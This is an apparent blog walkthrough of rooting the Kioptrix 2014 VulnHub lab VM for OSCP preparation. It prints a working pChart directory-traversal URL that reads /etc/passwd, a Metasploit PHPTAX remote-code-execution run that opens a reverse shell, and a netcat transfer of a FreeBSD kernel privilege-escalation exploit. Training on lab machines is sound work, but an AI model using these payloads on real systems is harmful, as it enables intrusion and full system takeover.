---
layout: single
title: "VulnHub - Kioptrix 5"
header:
  overlay_image: kioptrix-banner.jpg
  caption: "[__VulnHub__](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)"
related: true
comments: true
---

Welcome back to the Final Chapter of the Kioptrix VM Series!

These write-ups were created in aiding those starting the PWK Course, or who are training for the OSCP Certificate. The Kioptrix VM's were created to closely resemble those in the PWK Course. To read more about this, or if you haven't already read my first post for Kioptrix 1 - then I suggest you do so. That post can be found [here](https://jhalon.github.io/vulnhub-kioptrix1/).

 Alright - let's get to pwning the final Kioptrix 5 VM!

## Description:
As usual, this vulnerable machine is targeted at the beginner. It's not meant for the seasoned pentester or security geek that's been at this sort of stuff for 10 years. Everyone needs a place to start and all I want to do is help in that regard.

Also, before powering on the VM I suggest you remove the network card and re-add it. For some oddball reason it doesn't get its IP (well I do kinda know why but don't want to give any details away). So just add the VM to your virtualization software, remove and then add a network card. Set it to bridge mode and you should be good to go.

This was created using ESX 5.0 and tested on Fusion, but shouldn't be much of a problem on other platforms.

## The Hack:
As always let's run `netdiscover` to find all the devices on our network. This will allow us to pinpoint the Kioptrix VM.

```console
 Currently scanning: 192.168.5.0/16   |   Screen View: Unique Hosts            
                                                                               
 8 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 480               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     00:26:f2:0c:b3:82      1      60  NETGEAR                     
 192.168.1.9     d8:cb:8a:bf:d0:59      1      60  Micro-Star INTL CO., LTD.   
 192.168.1.10    18:03:73:1c:5d:6a      1      60  Dell Inc.                   
 192.168.1.159   00:0c:29:95:97:69      1      60  VMware, Inc.
```

The IP of 192.168.1.159 will be the address of our Kioptrix 5 VM. Once we have that, let's run an nmap scan to probe for any open ports and running services.

```console
root@kali:~# nmap -sS -A -n 192.168.1.159

Starting Nmap 7.40 ( https://nmap.org ) at 2016-12-29 12:33 CST
Nmap scan report for 192.168.1.159
Host is up (0.0012s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: 403 Forbidden
MAC Address: 00:0C:29:95:97:69 (VMware)
Device type: general purpose|specialized|router
Running (JUST GUESSING): FreeBSD 9.X|10.X (92%), OpenBSD 4.X (91%), Linux 2.6.X (90%), AVtech embedded (89%), HP embedded (85%)
OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10 cpe:/o:openbsd:openbsd:4.0 cpe:/o:linux:linux_kernel:2.6 cpe:/h:hp:procurve_7102dl
Aggressive OS guesses: FreeBSD 9.0-RELEASE - 10.3-RELEASE (92%), OpenBSD 4.0 (91%), OpenBSD 4.3 (91%), Linux 2.6.18 - 2.6.22 (90%), FreeBSD 9.0-RELEASE (89%), AVtech Room Alert 26W environmental monitor (89%), HP ProCurve Secure Router 7102dl (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   1.15 ms 192.168.1.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.65 seconds
```

From the initial scans we can see that there is TCP/80 and TCP/8080 open, both running Apache HTTPD. 

We can infer that both of these are running a web server of some kind - but, nmap is showing that TCP/8080 is forbidden... let's check to make sure that isn't a False Positive before we continue.

<a href="/images/kiop5-1.png"><img src="/images/kiop5-1.png"></a>

Nope, nmap was right - we don't have access to this. Well that's alright, maybe we will be able to get access in the future. For now let's just navigate to the website on TCP/80.

<a href="/images/kiop5-2.png"><img src="/images/kiop5-2.png"></a>

Okay - this one works. From here let's run a nikto scan to check for any vulnerabilities and/or misconfigurations.

```console
root@kali:~# nikto -h 192.168.1.159
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.159
+ Target Hostname:    192.168.1.159
+ Target Port:        80
+ Start Time:         2016-12-29 12:41:39 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
+ Server leaks inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sat Mar 29 12:22:52 2014
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ PHP/5.3.8 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 8345 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2016-12-29 12:43:00 (GMT-6) (81 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

It seems that the website is vulnerable to CVE-2002-0082 - but when I attempted to exploit this, it failed.

Fair enough - this is the last Kioptrix Machine, it wouldn't be that easy! At this point I decide to run [dirb](http://tools.kali.org/web-applications/dirb) to see if I can't enumerate any hidden directories.

```console
root@kali:~# dirb http://192.168.1.159

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Dec 29 13:18:29 2016
URL_BASE: http://192.168.1.159/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.159/ ----
+ http://192.168.1.159/cgi-bin/ (CODE:403|SIZE:210)                            
+ http://192.168.1.159/index.html (CODE:200|SIZE:152)                          
                                                                               
-----------------
END_TIME: Thu Dec 29 13:19:04 2016
DOWNLOADED: 4612 - FOUND: 2
```

Huh... nothing? Really? Well alright then, let's see if there is anything hidden in the source code.

```html
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>

 <body>
  <h1>It works!</h1>
 </body>
</html>
```

pChart seems interesting... let's see if we can't navigate to it.

<a href="/images/kiop5-3.png"><img src="/images/kiop5-3.png"></a>

Awesome, now we are getting somewhere! It seems from the URL that this version of pChart is 2.1.3. 

A quick Google search for that software revealed [multiple vulnerabilities](https://www.exploit-db.com/exploits/31173/), including [directory traversal](https://www.owasp.org/index.php/Path_Traversal)!

So following the vulnerability write-up, let's navigate to the following:

`http://192.168.1.159/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd` 

This should give us access to the passwd file on the Kioptrix Machine.

<a href="/images/kiop5-4.png"><img src="/images/kiop5-4.png"></a>

Nice, it works! At this point I started digging around the __/var/www__ directory, but that boded no results.

I decided to see if I can't access the Apache HTTP Config file. A quick Google search for the location of the config file led me to this [link](http://stackoverflow.com/questions/12202021/where-is-my-httpd-conf-file-located-apache).

Now that we can traverse the directory, let's go to __/usr/local/etc/apache22/httpd.conf__. Maybe we can learn more about what's on TCP/8080.

<a href="/images/kiop5-5.png"><img src="/images/kiop5-5.png"></a>

After some digging through the config file, we come across the following.

```
#
# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog "/var/log/httpd-error.log"


#
# The location and format of the access logfile (Common Logfile Format).
# If you do not define any access logfiles within a <VirtualHost>
# container, they will be logged here.  Contrariwise, if you *do*
# define per-<VirtualHost> access logfiles, transactions will be
# logged therein and *not* in this file.
#
#CustomLog "/var/log/httpd-access.log" common


SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>

</VirtualHost>
```

It seems that the only way we can access TCP/8080 is if our user agent is set to __Mozilla/4.0 Mozilla4_browser__. So let's do just that.

First let's open up a new tab in Firefox and navigate to __about:config__. And click "__I'll be careful, I promise!__".

<a href="/images/kiop5-6.png"><img src="/images/kiop5-6.png"></a>

The let's create a new string value called "__general.useragent.override__, and then press __OK__.

<a href="/images/kiop5-7.png"><img src="/images/kiop5-7.png"></a>

Once that's done add the following value to the String we just created - __Mozilla/4.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0__.

<a href="/images/kiop5-8.png"><img src="/images/kiop5-8.png"></a>

__Note__: To revert Firefox to the default user agent, right-click the “__general.useragent.override__”, click on "__Preference__" and select "__Reset__".

Okay, we should now have access to TCP/8080 - let's check it out!

<a href="/images/kiop5-9.png"><img src="/images/kiop5-9.png"></a>

Nice, let's follow the link!

<a href="/images/kiop5-10.png"><img src="/images/kiop5-10.png"></a>

Oh... well that's not good! It seems that this is some kind of Tax Return Program called __PHPTAX__. 

A quick Google search revealed that this software was vulnerable to a [Remote Code Execution Attack](https://www.exploit-db.com/exploits/21665/).

Alright, let's fire up [Metasploit](https://www.metasploit.com/) and see if we can't exploit this.

```console
root@kali:~# msfconsole 
                                                  

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        http://metasploit.com


Taking notes in notepad? Have Metasploit Pro track & report
your progress and findings -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.13.8-dev                          ]
+ -- --=[ 1607 exploits - 914 auxiliary - 278 post        ]
+ -- --=[ 471 payloads - 39 encoders - 9 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]


msf > use exploit/multi/http/phptax_exec 

msf exploit(phptax_exec) > options

Module options (exploit/multi/http/phptax_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      80               yes       The target port
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phptax/         yes       The path to the web application
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   PhpTax 0.8



msf exploit(phptax_exec) > set RHOST 192.168.1.159
RHOST => 192.168.1.159

msf exploit(phptax_exec) > set RPORT 8080
RPORT => 8080

msf exploit(phptax_exec) > run

[*] Started reverse TCP double handler on 192.168.1.3:4444 
[*] 192.168.1.1598080 - Sending request...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo JlVllpTK1dBln54a;
[*] Writing to socket A
[*] Writing to socket B
[*] Command: echo 808TsBO0YNvQXIfp;
[*] Reading from sockets...
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "JlVllpTK1dBln54a\r\n"
[*] Matching...
[*] A is input...
[*] Reading from socket B
[*] B: "808TsBO0YNvQXIfp\r\n"
[*] Matching...
[*] A is input...

whoami
Www
```

*In a Hackers Voice* - We're in...

Alright, let's drop a [TTY Shell](http://netsec.ws/?p=337) for some more functionality.

```console
/bin/sh -i
sh: can't access tty; job control turned off
$ id
uid=80(www) gid=80(www) groups=80(www)
```

Now that we have a working TTY Shell, let's do some reconnaissance and see if we can't find a privilege escalation exploit.

```console
$ uname -a

FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd6
```

Another quick Google search reveled that FreeBDS 9.0 was vulnerable to a [Intel SYSRET Kernel Privilege Escalation](https://www.exploit-db.com/exploits/28718/).

From here let's go ahead and copy over that exploit, open up a text editor and save it as a __.c__ file on your Kali box. Once that's done, open up a netcat connection and pipe the exploit file through it.

```console
root@kali:~# gedit sys.c
root@kali:~# nc -lvp 1234 < sys.c 
listening on [any] 1234 ...
```

Now that we have that waiting for us, let's navigate to the __/tmp__ folder on the Kioptrix Machine, and connect to our netcat connection - which will automatically download the exploit file for us.

```console
$ cd /tmp
$ nc -nv 192.168.1.3 1234 > sys.c
Connection to 192.168.1.3 1234 port [tcp/*] succeeded!
```

Yes! Let's compile the exploit and run it!

```console
$ gcc sys.c
$ ./a.out
[+] SYSRET FUCKUP!!
[+] Start Engine...
[+] Crotz...
[+] Crotz...
[+] Crotz...
[+] Woohoo!!!
$ whoami
root
```

## Closing:

Awesome job! We rooted the final Kioptrix Machine!

This level was way harder than the rest of the Kioptrix Machines. It included a new vulnerability through the use of a Directory Traversal, and also through the use of multiple exploits. This took me quite some time before I figured it out, but once I learned about the HTTPD Config file, it was smooth sailing from there.

Overall - for anyone that has completed these and is getting ready for the PWK and OSCP - just remember... never leave any stone unturned, think "outside the box", and always try to figure out how you can chain vulnerabilities and exploits to get somewhere you normally can't. Other than that, just remember to "__Try Harder__"!

Thanks for reading everyone!

And to those taking on the OSCP - god speed and good luck!
